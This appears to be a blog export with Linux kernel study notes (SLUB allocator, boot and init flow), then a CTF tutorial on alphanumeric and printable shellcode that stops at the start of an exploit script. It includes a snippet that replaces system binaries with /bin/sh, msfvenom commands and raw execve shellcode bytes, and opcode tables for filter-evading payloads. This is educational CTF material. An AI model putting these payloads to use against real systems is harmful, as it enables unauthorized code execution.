SLUB分配器：两个重要概念：slub分配器，slab缓冲区，伙伴系统。 几个重要结构体：struct kmem_cache kmalloc_caches[12] struct kmem_cache 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 59 /* 60 * Slab cache management. 61 */ 62 struct kmem_cache &#123; 63 struct kmem_cache_cpu __percpu *cpu_slab;//每个CPU对应的cpu_slab； 64 /* Used for retriving partial slabs etc */ 65 unsigned long flags; 66 unsigned long min_partial;//每个node节点中部分空缓冲区数量不能低于这个值；如果小于这个值，空闲slab缓冲区不能够进行释放 67 int size; /* The size of an object including meta data */ 68 int object_size; /* The size of an object without meta data */ 69 int offset; //空闲指针偏移量；/* Free pointer offset. */ 70 int cpu_partial; /* Number of per cpu partial objects to keep around */ //表示的是空闲对象数量，小于的情况下要去对应的node节点部分空链表中获取若干个部分空slab； //kmem_cache_order_objects 表示保存slab缓冲区的需要的页框数量的 //order值和objects数量的值，通过这个计算出需要多少页框，oo是默认 //值，max是最大值，min在分配失败的时候使用； 71 struct kmem_cache_order_objects oo; 72 73 /* Allocation and freeing of slabs */ 74 struct kmem_cache_order_objects max; 75 struct kmem_cache_order_objects min; 76 gfp_t allocflags; /* gfp flags to use on each alloc */ 77 int refcount; /* Refcount for slab cache destroy */ 78 void (*ctor)(void *);//该缓存区的构造函数，初始化的时候调用；并设置该cpu的当前使用的缓冲区； 79 int inuse; /* Offset to metadata */ 80 int align; /* Alignment */ 81 int reserved; /* Reserved bytes at the end of slabs */ 82 const char *name; /* Name (only for display!) */ 83 struct list_head list; /* List of slab caches *///所有kmem_cache结构都会链入这个链表； 84 #ifdef CONFIG_SYSFS 85 struct kobject kobj; /* For sysfs */ 86 #endif 87 #ifdef CONFIG_MEMCG_KMEM 88 struct memcg_cache_params *memcg_params; 89 int max_attr_size; /* for propagation, maximum size of a stored attr */ 90 #ifdef CONFIG_SYSFS 91 struct kset *memcg_kset; 92 #endif 93 #endif 94 95 #ifdef CONFIG_NUMA 96 /* 97 * Defragmentation by allocating from a remote node. 98 */ 99 int remote_node_defrag_ratio;//numa框架，该值越小，越倾向于在本结点分配对象；100 #endif //此高速缓存的slab链表，每个numa节点有一个，有可能该高速缓存有些slab处于其他几点上；101 struct kmem_cache_node *node[MAX_NUMNODES];102 &#125;; struct kmem_cache_cpu 123456789101140 struct kmem_cache_cpu &#123;41 void **freelist;//下一个空闲对象地址/* Pointer to next available object */42 unsigned long tid; /* Globally unique transaction id *///主要考虑并发；43 struct page *page; /* The slab from which we are allocating */ //cpu当前使用的slab缓冲区描述符，freelist会指向此slab的下一个空闲对象；44 struct page *partial; /* Partially allocated frozen slabs */ //cpu部分空slab链表，放到cpu的部分空slab链表中的slab会被冻结，而放入node中的部分空slab链表则解冻，解冻标志放在slab缓冲区描述符中；45 #ifdef CONFIG_SLUB_STATS46 unsigned stat[NR_SLUB_STAT_ITEMS];47 #endif48 &#125;; struct kmem_cache_node 1234567891011121314151617181920315 * The slab lists for all objects.316 */ 317 struct kmem_cache_node &#123;318 spinlock_t list_lock;319 320 #ifdef CONFIG_SLAB......331 #endif332 333 #ifdef CONFIG_SLUB334 unsigned long nr_partial;335 struct list_head partial;//只保留了部分空slab缓冲区；336 #ifdef CONFIG_SLUB_DEBUG337 atomic_long_t nr_slabs;338 atomic_long_t total_objects;339 struct list_head full;340 #endif341 #endif342 343 &#125;; 比较好文章： https://blog.csdn.net/lukuen/article/details/6935068 https://www.cnblogs.com/tolimit/p/4654109.html 一些相关函数： 12345678/* Tracepoints definitions. *///https://elixir.bootlin.com/linux/v4.12/source/include/linux/slab.h 可自行查看EXPORT_TRACEPOINT_SYMBOL(kmalloc);EXPORT_TRACEPOINT_SYMBOL(kmem_cache_alloc);EXPORT_TRACEPOINT_SYMBOL(kmalloc_node);EXPORT_TRACEPOINT_SYMBOL(kmem_cache_alloc_node);EXPORT_TRACEPOINT_SYMBOL(kfree);EXPORT_TRACEPOINT_SYMBOL(kmem_cache_free); 知识积累：linuxkernel完善教程https://github.com/gatieme/LDD-LinuxDeviceDrivers/tree/master/study/kernel open的第2/3个参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define O_ACCMODE 00000003 #define O_RDONLY 00000000 //只读打开 #define O_WRONLY 00000001 //只写打开 #define O_RDWR 00000002 //读写打开 #ifndef O_CREAT #define O_CREAT 00000100 //文件不存在则创建，需要mode_t #endif #ifndef O_EXCL #define O_EXCL 00000200 //如果同时指定了O_CREAT，而文件已经存在，则出错 #endif #ifndef O_NOCTTY #define O_NOCTTY 00000400 //如果pathname代表终端设备，则不将此设备分配作为此进程的控制终端 #endif #ifndef O_TRUNC #define O_TRUNC 00001000 //如果此文件存在，而且为只读或只写成功打开，则将其长度截短为0 #endif #ifndef O_APPEND #define O_APPEND 00002000 //每次写时都加到文件的尾端 #endif #ifndef O_NONBLOCK #define O_NONBLOCK 00004000 //如果pathname指的是一个FIFO、一个块特殊文件或一个字符特殊文件，则此选择项为此文件的本次打开操作和后续的I / O操作设置非阻塞 #endif #ifndef O_SYNC #define O_SYNC 00010000 //使每次write都等到物理I/O操作完成 #endif #ifndef FASYNC #define FASYNC 00020000 //兼容BSD的fcntl同步操作 #endif #ifndef O_DIRECT #define O_DIRECT 00040000 //直接磁盘操作标识，每次读写都不使用内核提供的缓存，直接读写磁盘设备 #endif #ifndef O_LARGEFILE #define O_LARGEFILE 00100000 // 大文件标识 #endif #ifndef O_DIRECTORY #define O_DIRECTORY 00200000 //必须是目录 #endif #ifndef O_NOFOLLOW #define O_NOFOLLOW 00400000 //不获取连接文件 #endif #ifndef O_NOATIME #define O_NOATIME 01000000 #endif #ifndef O_CLOEXEC #define O_CLOEXEC 02000000 /* set close_on_exec */ #endif #ifndef O_NDELAY #define O_NDELAY O_NONBLOCK #endif （3）Linux2.2以后特有的旗标，以避免一些系统安全问题。参数mode 则有下列数种组合，只有在建立新文件时才会生效，此外真正建文件时的权限会受到umask值所影响，因此该文件权限应该为（mode-umaks）。S_IRWXU00700 权限，代表该文件所有者具有可读、可写及可执行的权限。S_IRUSR 或S_IREAD，00400权限，代表该文件所有者具有可读取的权限。S_IWUSR 或S_IWRITE，00200 权限，代表该文件所有者具有可写入的权限。S_IXUSR 或S_IEXEC，00100 权限，代表该文件所有者具有可执行的权限。S_IRWXG 00070权限，代表该文件用户组具有可读、可写及可执行的权限。S_IRGRP 00040 权限，代表该文件用户组具有可读的权限。S_IWGRP 00020权限，代表该文件用户组具有可写入的权限。S_IXGRP 00010 权限，代表该文件用户组具有可执行的权限。S_IRWXO 00007权限，代表其他用户具有可读、可写及可执行的权限。S_IROTH 00004 权限，代表其他用户具有可读的权限S_IWOTH 00002权限，代表其他用户具有可写入的权限。S_IXOTH 00001 权限，代表其他用户具有可执行的权限。 系统调用入口及接口https://elixir.bootlin.com/linux/v5.0-rc8/source/fs https://elixir.bootlin.com/linux/v5.0-rc8/source/kernel/sys.c https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/syscalls.h 12345678910111213141516171819202122232425262728293031323334353637/* * In case of changes, please don't forget to update * include/trace/events/mmflags.h and tools/perf/builtin-kmem.c *//* Plain integer GFP bitmasks. Do not use this directly. */#define ___GFP_DMA 0x01u#define ___GFP_HIGHMEM 0x02u#define ___GFP_DMA32 0x04u#define ___GFP_MOVABLE 0x08u#define ___GFP_RECLAIMABLE 0x10u#define ___GFP_HIGH 0x20u#define ___GFP_IO 0x40u#define ___GFP_FS 0x80u#define ___GFP_NOWARN 0x200u#define ___GFP_RETRY_MAYFAIL 0x400u#define ___GFP_NOFAIL 0x800u#define ___GFP_NORETRY 0x1000u#define ___GFP_MEMALLOC 0x2000u#define ___GFP_COMP 0x4000u#define ___GFP_ZERO 0x8000u#define ___GFP_NOMEMALLOC 0x10000u#define ___GFP_HARDWALL 0x20000u#define ___GFP_THISNODE 0x40000u#define ___GFP_ATOMIC 0x80000u#define ___GFP_ACCOUNT 0x100000u#define ___GFP_DIRECT_RECLAIM 0x400000u#define ___GFP_WRITE 0x800000u#define ___GFP_KSWAPD_RECLAIM 0x1000000u#ifdef CONFIG_LOCKDEP#define ___GFP_NOLOCKDEP 0x2000000u#else#define ___GFP_NOLOCKDEP 0#endif___GFP_KSWAPD_RECLAIM | ___GFP_DIRECT_RECLAIM | ___GFP_FS | ___GFP_IO/* If the above are modified, __GFP_BITS_SHIFT may need updat 笔记：从mm/slab.h中的kmalloc 到mm/slub.h中的__kmalloc，size与flag为参数 将size与flag作为参数传给mm/slab_common.h中的kmalloc_slab，在其中用size确定index，然后用index到kmalloc_caches[](元素类型全是kmem_cache*)中确定kmem_cache*，返回一个kmem_cache*类型变量给s。 在include/linux/slub_def.h中的kmem_cache结构体： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/* * Slab cache management. */struct kmem_cache &#123; struct kmem_cache_cpu __percpu *cpu_slab; //important /* Used for retriving partial slabs etc */ slab_flags_t flags; unsigned long min_partial; unsigned int size; /* The size of an object including meta data */ unsigned int object_size;/* The size of an object without meta data */ unsigned int offset; /* Free pointer offset. */#ifdef CONFIG_SLUB_CPU_PARTIAL /* Number of per cpu partial objects to keep around */ unsigned int cpu_partial;#endif struct kmem_cache_order_objects oo; /* Allocation and freeing of slabs */ struct kmem_cache_order_objects max; struct kmem_cache_order_objects min; gfp_t allocflags; /* gfp flags to use on each alloc */ int refcount; /* Refcount for slab cache destroy */ void (*ctor)(void *); unsigned int inuse; /* Offset to metadata */ unsigned int align; /* Alignment */ unsigned int red_left_pad; /* Left redzone padding size */ const char *name; /* Name (only for display!) */ struct list_head list; /* List of slab caches */#ifdef CONFIG_SYSFS struct kobject kobj; /* For sysfs */ struct work_struct kobj_remove_work;#endif#ifdef CONFIG_MEMCG struct memcg_cache_params memcg_params; /* for propagation, maximum size of a stored attr */ unsigned int max_attr_size;#ifdef CONFIG_SYSFS struct kset *memcg_kset;#endif#endif#ifdef CONFIG_SLAB_FREELIST_HARDENED unsigned long random; //用来异或加密#endif#ifdef CONFIG_NUMA /* * Defragmentation by allocating from a remote node. */ unsigned int remote_node_defrag_ratio;#endif#ifdef CONFIG_SLAB_FREELIST_RANDOM unsigned int *random_seq;#endif#ifdef CONFIG_KASAN struct kasan_cache kasan_info;#endif unsigned int useroffset; /* Usercopy region offset */ unsigned int usersize; /* Usercopy region size */ struct kmem_cache_node *node[MAX_NUMNODES];&#125;; kmem_cache_cpu结构体： 1234567891011struct kmem_cache_cpu &#123; void **freelist; /* Pointer to next available object */ unsigned long tid; /* Globally unique transaction id */ struct page *page; /* The slab from which we are allocating */#ifdef CONFIG_SLUB_CPU_PARTIAL struct page *partial; /* Partially allocated frozen slabs */#endif#ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;; 之后将s和flags作为参数，调用了slab_alloc，返回一个指针，这个指针指向申请出来的chunk，返回给用户。 slab_alloc中又直接调用了slab_alloc_node slab_alloc与slab_alloc_node这两个函数为分配内存的最核心函数，kmalloc与kmem_cache_alloc是外围函数，kmalloc的参数为size与flags，kmem_cache_alloc的参数为kmem_cache*与flags。 kmem_cache_alloc：类似于kmalloc的申请内存的函数，核心在于s，传入的s不同，返回的指针不同： 12345678910void *kmem_cache_alloc(struct kmem_cache *s, gfp_t gfpflags)&#123; void *ret = slab_alloc(s, gfpflags, _RET_IP_); //传入的s不同slab_alloc返回的指针不同 trace_kmem_cache_alloc(_RET_IP_, ret, s-&gt;object_size, s-&gt;size, gfpflags); return ret;&#125;EXPORT_SYMBOL(kmem_cache_alloc); prepare_creds函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344struct cred *prepare_creds(void)&#123; struct task_struct *task = current; const struct cred *old; struct cred *new; validate_process_creds(); new = kmem_cache_alloc(cred_jar, GFP_KERNEL); //传入cred_jar这个kmem_cache* if (!new) return NULL; kdebug("prepare_creds() alloc %p", new); old = task-&gt;cred; memcpy(new, old, sizeof(struct cred)); atomic_set(&amp;new-&gt;usage, 1); set_cred_subscribers(new, 0); get_group_info(new-&gt;group_info); get_uid(new-&gt;user); get_user_ns(new-&gt;user_ns);#ifdef CONFIG_KEYS key_get(new-&gt;session_keyring); key_get(new-&gt;process_keyring); key_get(new-&gt;thread_keyring); key_get(new-&gt;request_key_auth);#endif#ifdef CONFIG_SECURITY new-&gt;security = NULL;#endif if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0) goto error; validate_creds(new); return new;error: abort_creds(new); return NULL;&#125;EXPORT_SYMBOL(prepare_creds); 1234567891011rm /bin/umountecho -ne '#!/bin/sh\n/bin/sh' &gt; /bin/umountchmod +x /bin/umountexitrm /sbin/poweroffecho -ne '#!/bin/sh\n/bin/sh' &gt; /sbin/poweroffchmod +x /sbin/poweroffexitexit https://www.cnblogs.com/pengdonglin137/p/3328889.html 除了基本的命令之外，BusyBox还支持init功能，如同其它的init一样，busybox的init也是完成系统的初始化工作，关机前的工作等等，我们知道在Linux的内核被载入之后，机器就把控制权转交给内核，linux的内核启动之后，做了一些工作，然后找到根文件系统里面的init程序，并执行它，BusyBox的init进程会依次进行以下工作： 为init设置信号处理过程 初始化控制台 剖析/etc/inittab文件 执行系统初始化命令行，缺省情况下会使用/etc/init.d/rcS 执行所有导致init暂停的inittab命令（动作类型：wait） 执行所有仅执行一次的inittab（动作类型：once） 一旦完成以上工作，init进程便会循环执行以下进程： 执行所有终止时必须重新启动的inittab命令 (动作类型：once） 执行所有终止时必须重新启动但启动前必须询问用户的inittab命令（动作类型：askfirst) 初始化控制台之后，BusyBox会检查/etc/inittab文件是否存在，如果此文件不存在，BusyBox会使用缺省的inittab配置，它主要为系统重引导，系统挂起以及init重启动设置缺省的动作，此外它还会为四个虚拟控制台（tty1到tty4）设置启动shell的动作。如果未建立这些设备文件，BusyBox会报错。 默认的/etc/inittab为：(放在源码的examples目录下) 123456789::sysinit:/etc/init.d/rcS::askfirst:/bin/sh::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/inittty2::askfirst:/bin/shtty3::askfirst:/bin/shtty4::askfirst:/bin/sh 123456789101112tty: terminal(终端),console(控制台) text terminalpty: pseudo terminal (ssh,gnome-terminal,konsole,xfce4-terminal,lxterminal) 虚拟终端,常用于远程连接ptmx: pseudo terminal master x (/dev/ptmx)pts: pseudo terminal slave (/dev/pts/0)ptmx与pts合作实现pty,pmtx为主,pts/*为从/dev/tty 当前终端/dev/tty* 控制终端/dev/ttyS* 串口终端/dev/ttyUSB* USB转串口终端/dev/ptmx pty主设备/dev/pts/* pty从设备 详解/dev/ptmx与/dev/pts/* 关于/sbin/init的一点东西 关于/sbin/mdev： https://www.cnblogs.com/pied/articles/5775282.html 简单来说，就是为了创建和管理 /dev 目录下的设备文件，包括初始化对象和动态更新。具体呢，在文件系统被加载时，通过读取内核放在 /sys/class 目录下的设备信息，在 /dev 目录下创建设备文件；在系统运行过程中，通过接收 uevent ，来判断是否需要移出设备文件。 简单来讲，/sys/class 多半负责列出内核支持项目的有无，mdev 则负责维护用户空间中那个可以读写的设备文件。 例如，我们写好了一个字符驱动，然后，我们可以在驱动 init 中使用 class_create() 和 class_device_create() 调用，以实现驱动被加载后，可以出现在 /sys/class 中，进而自动由 mdev 在 /dev 中创建设备节点。当然，我们也可以用 “mknode /dev/xxx c 主设备号 次设备号” 来手动创建，或者，将驱动注册为 MISC device，这样，驱动会出现在 /sys/misc/ 类下面，也会自动加载。 关于rdinit=/sbin/init： https://blog.csdn.net/larryliuqing/article/details/8204602 命令行未加rdinit=/sbin/init且无/init文件时，启动后报错信息： 123456789101112131415[ 0.611972] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(1,0)[ 0.632132] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 5.6.3 #3[ 0.643283] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014[ 0.655411] Call Trace:[ 0.657573] dump_stack+0x6d/0x95[ 0.666431] panic+0xfe/0x2ec[ 0.670303] mount_block_root+0x275/0x325[ 0.675738] mount_root+0x7c/0x7f[ 0.688065] prepare_namespace+0x13f/0x170 // &lt;== !!![ 0.693402] kernel_init_freeable+0x243/0x269 // &lt;== !!![ 0.701961] ? rest_init+0xb0/0xb0[ 0.703674] kernel_init+0xe/0x110[ 0.706105] ret_from_fork+0x35/0x40[ 0.710728] Kernel Offset: 0x33e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)[ 0.729192] Rebooting in 1 seconds.. 可以看到是在kernel_init_freeable中报错的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115static int __ref kernel_init(void *unused)&#123; int ret; kernel_init_freeable(); // &lt; ==== Here !!! /* need to finish all async __init code before freeing the memory */ async_synchronize_full(); ftrace_free_init_mem(); free_initmem(); mark_readonly(); /* * Kernel mappings are now finalized - update the userspace page-table * to finalize PTI. */ pti_finalize(); system_state = SYSTEM_RUNNING; numa_default_policy(); rcu_end_inkernel_boot(); if (ramdisk_execute_command) &#123; //&lt; ==== important !!!! 运行到这里说明rdinit ret = run_init_process(ramdisk_execute_command); //指向存在的文件(若不存在,preapre_namespace中 if (!ret) //会报错),为/init或其他指定的文件, return 0; //因为/sbin/init是busybox中默认存在的用于初始化 pr_err("Failed to execute %s (error %d)\n", //的文件,所以rdinit一般初始化为/sbin/init. ramdisk_execute_command, ret); //然后进入busybox中的init流程. &#125; //(运行/etc/init.d/rcS,解析/etc/inittab等操作 /* * We try each of these until one succeeds. * * The Bourne shell can be used instead of init if we are * trying to recover a really broken machine. */ if (execute_command) &#123; ret = run_init_process(execute_command); if (!ret) return 0; panic("Requested init %s failed (error %d).", execute_command, ret); &#125; if (!try_to_run_init_process("/sbin/init") || // &lt; ==== busybox中默认存在 !try_to_run_init_process("/etc/init") || // &lt; ==== busybox中默认不存在 !try_to_run_init_process("/bin/init") || // &lt; ==== busybox中默认不存在 !try_to_run_init_process("/bin/sh")) // &lt; ==== 肯定存在,但是若运行到这一步则会直接开启shell,不会进行busybox中的init流程(运行/etc/init.d/rcS,解析/etc/inittab等操作). return 0; panic("No working init found. Try passing init= option to kernel. " "See Linux Documentation/admin-guide/init.rst for guidance.");&#125;static noinline void __init kernel_init_freeable(void)&#123; /* * Wait until kthreadd is all set-up. */ wait_for_completion(&amp;kthreadd_done); /* Now the scheduler is fully set up and can do blocking allocations */ gfp_allowed_mask = __GFP_BITS_MASK; /* * init can allocate pages on any node */ set_mems_allowed(node_states[N_MEMORY]); cad_pid = task_pid(current); smp_prepare_cpus(setup_max_cpus); workqueue_init(); init_mm_internals(); do_pre_smp_initcalls(); lockup_detector_init(); smp_init(); sched_init_smp(); page_alloc_init_late(); /* Initialize page ext after all struct pages are initialized. */ page_ext_init(); do_basic_setup(); console_on_rootfs(); /* * check if there is an early userspace init. If yes, let it do all * the work */ //here is the reason why panic......... if (!ramdisk_execute_command) ramdisk_execute_command = "/init"; if (ksys_access((const char __user *) //因为不存在/init,所以会进入prepare_namespace流程 ramdisk_execute_command, 0) != 0) &#123; //去尝试mount root fs没有挂载rootfs.img的文件系统 ramdisk_execute_command = NULL; //所以要么指定好rdinit,要么创建一个/init prepare_namespace(); &#125; /* * Ok, we have completed the initial bootup, and * we're essentially up and running. Get rid of the * initmem segments and start the user-mode stuff.. * * rootfs is available now, try loading the public keys * and default modules */ integrity_load_keys();&#125; 内存init流程为: kernel_init() =&gt; run_init_process(&#39;/sbin/init or /init&#39;) =&gt; 进入busybox中的init_main() ==&gt; 解析/etc/inittab 其中buxybox起到上承kernel，下起user的作用。 可以先用下面的代码检测内核编译时是否开启了userfaultfd。 12345int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);if(uffd == -1)&#123; puts("[:(]userfaultfd syscall close..."); exit(0);&#125; initrd和initramfs的区别： https://zhidao.baidu.com/question/1495887129300510619.html 资料： http://staff.ustc.edu.cn/~xlanchen/ULK2011Spring/slides/2_2build+run+gdb%20linux-2.6.26.pdf]]></content>
      <categories>
        <category>LinuxKernel学习</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>LinuxKernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[花式shellcode]]></title>
    <url>%2F2020%2F04%2F15%2F%E8%8A%B1%E5%BC%8Fshellcode%2F</url>
    <content type="text"><![CDATA[0x00.前言废话shellcode是最具有pwn特色的东西之一，shellcode也并非仅仅是一段拿到shell的代码。 我对shellcode一直有一种恐惧感，因为我的基础不扎实，对汇编指令的opcode不够了解，所以心里很排斥做shellcode的题。 但是，人想要进步，就必须要走出自己的舒适区，必须要经历痛苦才能成长。所以我花了接近三天时间，总结了关于花式shellcode的一些技巧和经验。也找了一些题目来演示。整理完之后感觉对shellcode的理解更上了好几层楼。。。 0x01.前置知识，一些工具，一些理解两个概念：Alphanumeric shellcode ：字符在[A-Z,a-z,0-9]范围内，ASCII码范围为[0x30~0x39]，[0x41~0x5A]，[0x61~0x7A]。 Printable shellcode ：字符的ASCII码在[0x20,0x7E]范围内。 以下汇编指令总结皆为x86，x64大部分根据功能可对应。 opcode为Printable的汇编指令总结如下参考自http://pzhxbz.cn/?p=78 ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/*1.数据传送:*/push/pop eax…pusha/popa/*2.算术运算:*/inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]/*3.逻辑运算:*/and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]/*4.比较指令:*/cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]/*5.转移指令:*/push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable/*6.交换al, ah*/push eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax/*7.清零:*/push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 我们观察思考后可以发现几个点： int 0x80不在其范围内，其opcode为\xcd\x80，这是比较麻烦的一个地方。 运算指令只有sub，xor，and。 opcode为Alphanumeric的汇编指令总结如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950xor reg8/mem8,reg8 ;0x30 =&gt; 0xor reg16/mem16,reg16 ;0x31 =&gt; 1xor reg8,reg8/mem8 ;0x32 =&gt; 2xor reg16,reg16/mem16 ;0x33 =&gt; 3xor al,immed8 ;0x34 =&gt; 4xor eax,immed16 ;0x35 =&gt; 5cmp reg8/mem8,reg8 ;0x38 =&gt; 8cmp reg16/mem16,reg16 ;0x39 =&gt; 9inc ecx ;0x41 =&gt; Ainc edx ;0x42 =&gt; Binc ebx ;0x43 =&gt; Cinc esp ;0x44 =&gt; Dinc ebp ;0x45 =&gt; Einc esi ;0x46 =&gt; Finc edi ;0x47 =&gt; Gdec eax ;0x48 =&gt; Hdec ecx ;0x49 =&gt; Idec edx ;0x4A =&gt; Jdec ebx ;0x4B =&gt; Kdec esp ;0x4C =&gt; Ldec ebp ;0x4D =&gt; Mdec esi ;0x4E =&gt; Ndec edi ;0x4F =&gt; Opush eax ;0x50 =&gt; Ppush ebx ;0x53 =&gt; Spush ecx ;0x51 =&gt; Qpush edx ;0x52 =&gt; Rpush esp ;0x54 =&gt; Tpush ebp ;0x55 =&gt; U push esi ;0x56 =&gt; Vpush edi ;0x57 =&gt; Wpop eax ;0x58 =&gt; Xpop ecx ;0x59 =&gt; Ypop edx ;0x5A =&gt; Zpopa ;0x61 =&gt; apush immed16 ;0x68 =&gt; himul reg16/mem16,immed16 ;0x69 =&gt; ipush immed8 ;0x6A =&gt; jimul reg8/mem8,immed8 ;0x6B =&gt; kjo immed8 ;0x70 =&gt; pjno immed8 ;0x71 =&gt; qjb immed8 ;0x72 =&gt; rjnb immed8 ;0x73 =&gt; sjz immed8 ;0x74 =&gt; tjnz immed8 ;0x75 =&gt; ujbe immed8 ;0x76 =&gt;vja immed8 ;0x77 =&gt; wjs immed8 ;0x78 =&gt; xjns immed8 ;0x79 =&gt; yjp immed8 ;0x7A =&gt; z 汇编指令机器码对应表：https://wenku.baidu.com/view/bf5227ecaeaad1f346933f86.html 常用的如下： PUSH系列： 123456789101112131415push es ;0x06push cs ;0x0Epush ss ;0x16push ds ;0x1Epush eax ;0x50 =&gt; Ppush ebx ;0x53 =&gt; Spush ecx ;0x51 =&gt; Qpush edx ;0x52 =&gt; Rpush esp ;0x54 =&gt; Tpush ebp ;0x55 =&gt; U push esi ;0x56 =&gt; Vpush edi ;0x57 =&gt; Wpusha ;0x60 =&gt; &apos; (单引号)push immed16 ;0x68 =&gt; hpush immed8 ;0x6A =&gt; j POP系列： 1234567891011121314pop es ;0x07pop ss ;0x17pop ds ;0x1Fpop eax ;0x58 =&gt; Xpop ebx ;0x5B =&gt; [pop ecx ;0x59 =&gt; Ypop edx ;0x5A =&gt; Zpop ebp ;0x5D =&gt; ]pop esp ;0x5C =&gt; \pop esi ;0x5E =&gt; ^pop edi ;0x5F =&gt; _popa ;0x61 =&gt; apop reg16/mem16 ;0x8Fpopf ;0x9D 跳转系列： 1234567jmp immed8 ;0xEBjmp immed16 ;0xE9jmp immed32 ;0xEAjz ;0x74 =&gt; t 使用时需要ZF标志位为1，使用p $eflags查看jnz ;0x75 =&gt; u 使用时需要ZF标志位为0，使用p $eflags查看call immed16 ;0xE8call immed32 ;0x9A 运算系列： 123456789101112131415161718192021/*and系列全可打印，但全不为数字*/and reg8/mem8,reg8 ;0x20and reg16/mem16,reg16 ;0x21and reg8,reg8/mem8 ;0x22and reg16,reg16/mem16 ;0x23and al,immed8 ;0x24and ax,immed16 ;0x25/*xor系列全为数字，较好*/xor reg8/mem8,reg8 ;0x30 =&gt; 0xor reg16/mem16,reg16 ;0x31 =&gt; 1xor reg8,reg8/mem8 ;0x32 =&gt; 2xor reg16,reg16/mem16 ;0x33 =&gt; 3xor al,immed8 ;0x34 =&gt; 4xor ax,immed16 ;0x35 =&gt; 5/*sub系列全可打印，但全不为数字*/sub reg8/mem8,reg8 ;0x28sub reg16/mem16,reg16 ;0x29sub reg8,reg8/mem8 ;0x2asub reg16,reg16/mem16 ;0x2bsub al,immed8 ;0x2csub ax,immed16 ;0x2d 一些工具：msfvenom：自带的编码器，可直接生成x86_shellcode： 1msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_mixed BufferRegister=EAX 需要注意的是BufferRegister需要赋值为存有shellcode地址的寄存器。 编码自己的shellcode方法如下： 1python -c 'import sys; sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX 弊端为只有x86的编码器，对于x86_64的则需要另辟蹊径。优点为简单方便，且可以选择的有全大写字母，全小写字母和字母数字混合等多种编码器。用如下命令可自行查看选择编码器。 1msfvenom -l encoders shellcode_encoder： https://github.com/ecx86/shellcode_encoder 可编码x86_64的shellcode，同样需要确定指向shellcode的寄存器。用法请自行查看。 PrintableShellcodeCreator： https://github.com/WangYihang/PrintableShellcodeCreator ALPHA3： 网上使用教程较少，请参考这一篇：https://www.jianshu.com/p/8ae8c055e35c 项目地址：https://github.com/SkyLined/alpha3 一些理解： 一般Alphanumeric/Printable shellcode的编写，无论是自己写还是用工具编码，都应该先去看清调用shellcode时寄存器的情况，不同的情况编写方法是不同的，一般有寄存器指向shellcode地址的话编写起来会方便很多。 要善于去观察栈上的情况，有很多难题都是有特定环境下的解的，可能就是栈上一个特殊的数据导致这道题的利用可以写出。 自己编码shellcode的难点主要在于两方面，一是int 0x80/syscall的处理，二是/bin/sh的地址怎么传给对应的寄存器。第一个难题可用xor,sub,and等运算符通过可打印的字符运算后得出，需要根据具体情况而定，第二个难题可用间接方法来解决，比如先调用read，或者自己定义/bin/sh字符串，然后在call时让程序自己传入栈中。 例如： 123456789 call here .ascii &quot;/bin/sh&quot; .byte 0here: pop rdi xor rsi,rsi xor rdx,rdx mov rax,0x3b syscall 0x02.pwnable.tw_orw思路：解法如题，因为加了沙箱，过滤了execve，只要用open，read，write读出/home/orw/flag文件即可。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *path = './orw'debug = 1attach = 0#P = 